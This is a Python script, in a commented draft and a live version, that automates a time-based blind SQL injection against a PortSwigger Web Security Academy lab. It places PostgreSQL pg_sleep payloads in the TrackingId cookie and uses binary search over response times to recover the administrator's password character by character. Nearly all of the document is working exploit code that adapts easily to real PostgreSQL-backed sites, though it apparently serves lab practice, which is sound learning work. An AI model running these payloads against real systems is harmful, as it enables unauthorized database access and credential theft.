# import requests
# import time


# # ============================================================
# # CONFIG
# # ============================================================

# LAB_URL = "https://YOUR-LAB-ID.web-security-academy.net/"

# TRACKING_ID = "YOUR_TRACKING_ID"
# SESSION = "YOUR_SESSION_COOKIE"

# # Use a smaller delay during extraction.
# SLEEP_TIME = 3

# # Anything this much slower than baseline is considered TRUE.
# THRESHOLD = 1.5


# # ============================================================
# # HTTP SESSION
# # ============================================================

# session = requests.Session()

# session.cookies.set("TrackingId", TRACKING_ID)
# session.cookies.set("session", SESSION)


# # ============================================================
# # SEND REQUEST
# # ============================================================

# def send_request(tracking_id):

#     session.cookies.set("TrackingId", tracking_id)

#     start = time.perf_counter()

#     response = session.get(
#         LAB_URL,
#         timeout=15
#     )

#     elapsed = time.perf_counter() - start

#     return elapsed


# # ============================================================
# # BASELINE
# # ============================================================

# print("\n" + "=" * 70)
# print("[1] Measuring baseline response time")
# print("=" * 70)

# times = []

# for i in range(3):

#     elapsed = send_request(TRACKING_ID)

#     times.append(elapsed)

#     print(
#         f"[BASELINE] Request {i + 1}: "
#         f"{elapsed:.2f}s"
#     )


# baseline = sum(times) / len(times)

# print(f"\n[+] Average baseline = {baseline:.2f}s")


# # ============================================================
# # CONDITIONAL SQL INJECTION
# # ============================================================

# def test_condition(condition):

#     payload = (
#         TRACKING_ID
#         + "'||("
#         + "SELECT CASE "
#         + f"WHEN ({condition}) "
#         + f"THEN pg_sleep({SLEEP_TIME}) "
#         + "ELSE pg_sleep(0) "
#         + "END "
#         + "FROM users "
#         + "WHERE username='administrator'"
#         + ")--"
#     )

#     elapsed = send_request(payload)

#     delayed = elapsed >= baseline + THRESHOLD

#     print(
#         f"[TEST] {condition}"
#     )

#     print(
#         f"       Response: {elapsed:.2f}s"
#     )

#     print(
#         f"       Result: "
#         f"{'TRUE' if delayed else 'FALSE'}"
#     )

#     return delayed


# # ============================================================
# # CONFIRM SLEEP
# # ============================================================

# print("\n" + "=" * 70)
# print("[2] Confirming conditional sleep")
# print("=" * 70)

# condition = "1=1"

# if test_condition(condition):

#     print("\n[+] Conditional sleep confirmed.")

# else:

#     print("\n[-] Conditional sleep failed.")
#     exit()


# # ============================================================
# # CHECK ADMINISTRATOR
# # ============================================================

# print("\n" + "=" * 70)
# print("[3] Checking administrator")
# print("=" * 70)

# condition = (
#     "EXISTS("
#     "SELECT 1 FROM users "
#     "WHERE username='administrator'"
#     ")"
# )

# if test_condition(condition):

#     print("\n[+] administrator exists.")

# else:

#     print("\n[-] administrator not found.")
#     exit()


# # ============================================================
# # FIND PASSWORD LENGTH
# # ============================================================

# print("\n" + "=" * 70)
# print("[4] Finding password length")
# print("=" * 70)

# password_length = None

# for length in range(1, 51):

#     condition = (
#         "username='administrator' "
#         f"AND LENGTH(password)={length}"
#     )

#     if test_condition(condition):

#         password_length = length

#         print(
#             f"\n[+] Password length = "
#             f"{password_length}"
#         )

#         break


# if password_length is None:

#     print(
#         "\n[-] Password length could not be found."
#     )

#     exit()


# # ============================================================
# # BINARY SEARCH FOR ONE CHARACTER
# # ============================================================

# def find_character(position):

#     """
#     Finds the ASCII value of the password character
#     at the specified position.

#     ASCII range:

#         32 -> 126

#     We repeatedly ask:

#         Is ASCII(character) > middle?

#     Each answer removes roughly half the possibilities.
#     """

#     low = 32
#     high = 126

#     print(
#         f"\n[BINARY] Finding character at position "
#         f"{position}"
#     )

#     while low < high:

#         middle = (low + high) // 2

#         condition = (
#             "username='administrator' "
#             f"AND ASCII("
#             f"SUBSTRING(password,{position},1)"
#             f")>{middle}"
#         )

#         print(
#             f"\n[BINARY] Range: "
#             f"{low}-{high}"
#         )

#         print(
#             f"[BINARY] Testing ASCII > {middle}"
#         )

#         result = test_condition(condition)

#         if result:

#             # Character is greater than middle.

#             print(
#                 f"[BINARY] TRUE → "
#                 f"searching {middle + 1}-{high}"
#             )

#             low = middle + 1

#         else:

#             # Character is <= middle.

#             print(
#                 f"[BINARY] FALSE → "
#                 f"searching {low}-{middle}"
#             )

#             high = middle

#     character = chr(low)

#     print(
#         f"\n[+] Position {position}: "
#         f"ASCII {low} = '{character}'"
#     )

#     return character


# # ============================================================
# # EXTRACT PASSWORD
# # ============================================================

# print("\n" + "=" * 70)
# print("[5] Extracting password using BINARY SEARCH")
# print("=" * 70)

# password = ""

# for position in range(1, password_length + 1):

#     character = find_character(position)

#     password += character

#     print(
#         "\n" + "-" * 70
#     )

#     print(
#         f"[PASSWORD] {password}"
#     )

#     print(
#         "-" * 70
#     )


# # ============================================================
# # FINAL RESULT
# # ============================================================

# print("\n" + "=" * 70)
# print("[6] COMPLETE")
# print("=" * 70)

# print(
#     f"\n[+] Administrator password:"
# )

# print(
#     f"    {password}"
# )

import requests
import time


# ============================================================
# CONFIGURATION
# ============================================================

LAB_URL = "https://0a4d0014032657fd808258be0002006c.web-security-academy.net/"

TRACKING_ID = "SboysN4Iy55CHPJN"
SESSION = "QJOGDKiqDkigKUPCCmv05b2dxD5smXXb"

# ------------------------------------------------------------
# Initial proof of vulnerability
# ------------------------------------------------------------
INITIAL_SLEEP = 10

# ------------------------------------------------------------
# Smaller delay for password extraction.
# Using 3 seconds makes extraction much faster.
# ------------------------------------------------------------
EXTRACT_SLEEP = 3

# ------------------------------------------------------------
# Timing threshold
#
# If:
#
# response_time > baseline + THRESHOLD
#
# we consider the SQL condition TRUE.
# ------------------------------------------------------------
THRESHOLD = 1.5

# Printable ASCII characters:
#
# 32 = space
# 126 = ~
#
# This covers:
# letters
# numbers
# punctuation
# symbols
#
ASCII_MIN = 32
ASCII_MAX = 126

# Maximum password length to test
MAX_PASSWORD_LENGTH = 50


# ============================================================
# HTTP SESSION
# ============================================================

http = requests.Session()

http.cookies.set("TrackingId", TRACKING_ID)
http.cookies.set("session", SESSION)


# ============================================================
# SEND REQUEST
# ============================================================

def send_request(tracking_id):
    """
    Sends a request with the supplied TrackingId
    and measures the response time.
    """

    http.cookies.set("TrackingId", tracking_id)

    start = time.perf_counter()

    response = http.get(
        LAB_URL,
        timeout=20
    )

    elapsed = time.perf_counter() - start

    return elapsed


# ============================================================
# BASELINE
# ============================================================

print()
print("=" * 70)
print("[1] MEASURING BASELINE RESPONSE TIME")
print("=" * 70)

baseline_samples = []

for i in range(3):

    elapsed = send_request(TRACKING_ID)

    baseline_samples.append(elapsed)

    print(
        f"[BASELINE] Request {i + 1}: "
        f"{elapsed:.2f}s"
    )


baseline = sum(baseline_samples) / len(baseline_samples)

print()
print(f"[+] Average baseline: {baseline:.2f}s")


# ============================================================
# STEP 2
# CONFIRM 10 SECOND SLEEP
# ============================================================

print()
print("=" * 70)
print("[2] CONFIRMING 10-SECOND PostgreSQL SLEEP")
print("=" * 70)

sleep_payload = (
    TRACKING_ID
    + "'||pg_sleep(10)--"
)

print()
print("[PAYLOAD]")
print(sleep_payload)

print()
print("[INFO] Sending request...")
print("[INFO] Expected response: approximately 10 seconds")

elapsed = send_request(sleep_payload)

print()
print(
    f"[RESULT] Response time: {elapsed:.2f}s"
)

if elapsed >= 8:

    print()
    print("[+] SUCCESS")
    print("[+] PostgreSQL time delay confirmed.")

else:

    print()
    print("[-] FAILED")
    print(
        "[-] 10-second delay was not observed."
    )

    print()
    print("[DEBUG]")
    print(f"Baseline: {baseline:.2f}s")
    print(f"Observed: {elapsed:.2f}s")

    exit()


# ============================================================
# CONDITIONAL SQL INJECTION
# ============================================================

def test_condition(condition):
    """
    Executes a conditional PostgreSQL sleep.

    TRUE:
        pg_sleep(EXTRACT_SLEEP)

    FALSE:
        pg_sleep(0)

    The response time tells us whether the condition
    was TRUE or FALSE.
    """

    payload = (
        TRACKING_ID
        + "'||("
        + "SELECT CASE "
        + f"WHEN ({condition}) "
        + f"THEN pg_sleep({EXTRACT_SLEEP}) "
        + "ELSE pg_sleep(0) "
        + "END "
        + "FROM users "
        + "WHERE username='administrator'"
        + ")--"
    )

    elapsed = send_request(payload)

    is_true = (
        elapsed >= baseline + THRESHOLD
    )

    print()
    print("[SQL TEST]")
    print(f"Condition : {condition}")
    print(f"Time      : {elapsed:.2f}s")
    print(
        f"Decision  : "
        f"{'TRUE' if is_true else 'FALSE'}"
    )

    return is_true


# ============================================================
# STEP 3
# CHECK ADMINISTRATOR
# ============================================================

print()
print("=" * 70)
print("[3] CHECKING ADMINISTRATOR USER")
print("=" * 70)

condition = (
    "EXISTS("
    "SELECT 1 "
    "FROM users "
    "WHERE username='administrator'"
    ")"
)

if test_condition(condition):

    print()
    print("[+] administrator exists.")

else:

    print()
    print("[-] administrator was not detected.")
    exit()


# ============================================================
# STEP 4
# FIND PASSWORD LENGTH
# ============================================================

print()
print("=" * 70)
print("[4] FINDING PASSWORD LENGTH")
print("=" * 70)

password_length = None

for length in range(1, MAX_PASSWORD_LENGTH + 1):

    condition = (
        "username='administrator' "
        f"AND LENGTH(password)={length}"
    )

    print()
    print(
        f"[LENGTH TEST] Testing length = {length}"
    )

    if test_condition(condition):

        password_length = length

        print()
        print(
            f"[+] PASSWORD LENGTH = "
            f"{password_length}"
        )

        break


if password_length is None:

    print()
    print("[-] Password length not found.")
    exit()


# ============================================================
# STEP 5
# BINARY SEARCH ONE CHARACTER
# ============================================================

def find_character(position):

    """
    Find one password character using binary search.

    Search space:

        ASCII 32 -> 126

    Question:

        Is ASCII(character) > midpoint?

    TRUE:

        low = midpoint + 1

    FALSE:

        high = midpoint

    Eventually:

        low == high

    and that value is the character's ASCII code.
    """

    low = ASCII_MIN
    high = ASCII_MAX

    print()
    print("=" * 70)
    print(
        f"[BINARY SEARCH] POSITION {position}"
    )
    print("=" * 70)

    while low < high:

        midpoint = (low + high) // 2

        condition = (
            "username='administrator' "
            f"AND ASCII("
            f"SUBSTRING(password,{position},1)"
            f")>{midpoint}"
        )

        print()
        print(
            f"[SEARCH RANGE] "
            f"{low} - {high}"
        )

        print(
            f"[QUESTION] "
            f"Is ASCII(character) > {midpoint}?"
        )

        result = test_condition(condition)

        if result:

            # TRUE:
            #
            # character > midpoint
            #
            # discard lower half

            low = midpoint + 1

            print(
                f"[BINARY] TRUE"
            )

            print(
                f"[BINARY] New range: "
                f"{low} - {high}"
            )

        else:

            # FALSE:
            #
            # character <= midpoint
            #
            # discard upper half

            high = midpoint

            print(
                f"[BINARY] FALSE"
            )

            print(
                f"[BINARY] New range: "
                f"{low} - {high}"
            )

    ascii_value = low
    character = chr(ascii_value)

    print()
    print(
        f"[+] POSITION {position}"
    )

    print(
        f"[+] ASCII VALUE = {ascii_value}"
    )

    print(
        f"[+] CHARACTER   = {repr(character)}"
    )

    return character


# ============================================================
# STEP 6
# EXTRACT COMPLETE PASSWORD
# ============================================================

print()
print("=" * 70)
print("[5] EXTRACTING PASSWORD")
print("=" * 70)

password = ""

for position in range(1, password_length + 1):

    character = find_character(position)

    password += character

    print()
    print("-" * 70)
    print(
        f"[PASSWORD SO FAR] {password!r}"
    )
    print("-" * 70)


# ============================================================
# FINAL RESULT
# ============================================================

print()
print("=" * 70)
print("[6] EXTRACTION COMPLETE")
print("=" * 70)

print()
print(
    f"[+] Administrator password: "
    f"{password}"
)

print()
print("[+] Use this password to log in to the lab.")